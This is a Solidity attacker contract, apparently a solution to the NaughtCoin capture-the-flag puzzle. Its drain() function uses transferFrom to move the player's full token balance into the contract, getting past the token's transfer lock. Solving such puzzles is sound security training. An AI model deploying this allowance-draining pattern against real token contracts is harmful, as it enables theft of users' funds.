pragma solidity ^0.8.0;

interface INaughtCoin {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract AttackerFinalCorrectAmount {
    INaughtCoin public naughtCoin;
    address public player = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    constructor() {
        naughtCoin = INaughtCoin(0xa16E02E87b7454126E5E10d957A927A7F5B5d2be);
    }

    function drain() external {
        // Use correct amount (1,000,000 * 10^18 = 10^24)
        // Max possible approval with 1000000000000000000000000
        naughtCoin.transferFrom(player, address(this), 1000000000000000000000000);
    }
}